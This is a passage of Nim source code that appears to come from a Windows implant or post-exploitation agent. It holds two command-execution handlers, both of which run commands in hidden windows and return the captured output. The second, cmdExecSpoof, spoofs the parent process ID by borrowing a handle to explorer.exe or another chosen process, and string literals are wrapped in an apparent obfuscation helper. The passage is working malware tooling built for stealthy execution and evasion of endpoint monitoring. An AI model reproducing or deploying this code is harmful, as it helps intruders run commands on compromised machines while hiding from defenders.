  sa.nLength              = DWORD(sizeof(SECURITY_ATTRIBUTES))
  sa.bInheritHandle       = TRUE   # child must inherit the write end
  sa.lpSecurityDescriptor = nil

  var hRead, hWrite: HANDLE
  if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == 0:
    return s("[EXEC] CreatePipe failed: ") & $GetLastError()


  SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)

  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb         = DWORD(sizeof(STARTUPINFOW))
  si.dwFlags    = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
  si.wShowWindow = 0          # SW_HIDE
  si.hStdOutput = hWrite
  si.hStdError  = hWrite
  # Leave hStdInput as 0 (no stdin for the child)

  var wCmd = cmdLine.newWideCString
  let ok = CreateProcessW(
    nil,
    wCmd,
    nil, nil,
    TRUE, 
    CREATE_NO_WINDOW,
    nil, nil,
    addr si,
    addr pi,
  )


  CloseHandle(hWrite)

  if not ok.bool:
    CloseHandle(hRead)
    return s("[EXEC] CreateProcessW failed: ") & $GetLastError()


  var output = ""
  var buf    = newString(4096)
  var bytesRead: DWORD
  while ReadFile(hRead, addr buf[0], DWORD(buf.len), addr bytesRead, nil).bool and bytesRead > 0:
    output.add(buf[0 ..< bytesRead.int])

  CloseHandle(hRead)


  WaitForSingleObject(pi.hProcess, INFINITE)
  var exitCode: DWORD
  GetExitCodeProcess(pi.hProcess, addr exitCode)
  CloseHandle(pi.hProcess)
  CloseHandle(pi.hThread)

  if output.len == 0:
    output = s("(no output)")

  s("[EXEC ") & cmdLine.split(' ')[0] & s("]\n") &
  output.strip() & s("\nExit: ") & $exitCode


#################################################################

proc cmdExecSpoof*(cmdLine: string; spoofParentName: string = ""): string =
  if cmdLine.len == 0:
    return s("[EXEC_SPOOF] Usage: exec_spoof <cmdline> [parent_process_name]")


  let parentName = if spoofParentName.len > 0: spoofParentName
                   else: s("explorer.exe")

  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE:
    return s("[EXEC_SPOOF] CreateToolhelp32Snapshot failed: ") & $GetLastError()

  var pe: PROCESSENTRY32W
  pe.dwSize = DWORD(sizeof(PROCESSENTRY32W))
  var parentPid: DWORD = 0

  if Process32FirstW(snap, addr pe).bool:
    while true:
      let exeName = $cast[WideCString](addr pe.szExeFile[0])
      if exeName.toLowerAscii() == parentName.toLowerAscii():
        parentPid = pe.th32ProcessID
        break
      if not Process32NextW(snap, addr pe).bool:
        break
  CloseHandle(snap)

  if parentPid == 0:
    return s("[EXEC_SPOOF] Could not find process: ") & parentName


  let hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid)
  if hParent == 0:
    return s("[EXEC_SPOOF] OpenProcess failed (pid=") & $parentPid &
           s("): ") & $GetLastError()


  var attrListSize: SIZE_T = 0
  discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrListSize)

  var attrListBuf = newSeq[byte](attrListSize)
  let pAttrList   = cast[LPPROC_THREAD_ATTRIBUTE_LIST](addr attrListBuf[0])

  if InitializeProcThreadAttributeList(pAttrList, 1, 0, addr attrListSize) == 0:
    CloseHandle(hParent)
    return s("[EXEC_SPOOF] InitializeProcThreadAttributeList failed: ") & $GetLastError()


  var hParentCopy = hParent
  if UpdateProcThreadAttribute(
    pAttrList,
    0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    addr hParentCopy,
    sizeof(HANDLE).SIZE_T,
    nil, nil,
  ) == 0:
    DeleteProcThreadAttributeList(pAttrList)
    CloseHandle(hParent)
    return s("[EXEC_SPOOF] UpdateProcThreadAttribute failed: ") & $GetLastError()


  var sa: SECURITY_ATTRIBUTES
  sa.nLength        = DWORD(sizeof(SECURITY_ATTRIBUTES))
  sa.bInheritHandle = TRUE
  var hRead, hWrite: HANDLE
  if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == 0:
    DeleteProcThreadAttributeList(pAttrList)
    CloseHandle(hParent)
    return s("[EXEC_SPOOF] CreatePipe failed: ") & $GetLastError()
  SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)


  var si: STARTUPINFOEXW
  si.StartupInfo.cb         = DWORD(sizeof(STARTUPINFOEXW))
  si.StartupInfo.dwFlags    = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
  si.StartupInfo.wShowWindow = 0
  si.StartupInfo.hStdOutput = hWrite
  si.StartupInfo.hStdError  = hWrite
  si.lpAttributeList        = pAttrList   # ← this is where the PPID override lives

  var pi: PROCESS_INFORMATION
  var wCmd = cmdLine.newWideCString

  let ok = CreateProcessW(
    nil, wCmd, nil, nil,
    TRUE,

    CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
    nil, nil,
    cast[LPSTARTUPINFOW](addr si),
    addr pi,
  )

  CloseHandle(hWrite)
  DeleteProcThreadAttributeList(pAttrList)
  CloseHandle(hParent)

  if not ok.bool:
    CloseHandle(hRead)
    return s("[EXEC_SPOOF] CreateProcessW failed: ") & $GetLastError()


  var output = ""
  var buf    = newString(4096)
  var bytesRead: DWORD
  while ReadFile(hRead, addr buf[0], DWORD(buf.len), addr bytesRead, nil).bool and bytesRead > 0:
    output.add(buf[0 ..< bytesRead.int])
  CloseHandle(hRead)

  WaitForSingleObject(pi.hProcess, INFINITE)
  var exitCode: DWORD
  GetExitCodeProcess(pi.hProcess, addr exitCode)
  CloseHandle(pi.hProcess)
  CloseHandle(pi.hThread)

  if output.len == 0:
    output = s("(no output)")

  s("[EXEC_SPOOF ") & cmdLine.split(' ')[0] & s(" | parent=") & parentName &
  s(" pid=") & $parentPid & s("]\n") &
  output.strip() & s("\nExit: ") & $exitCode
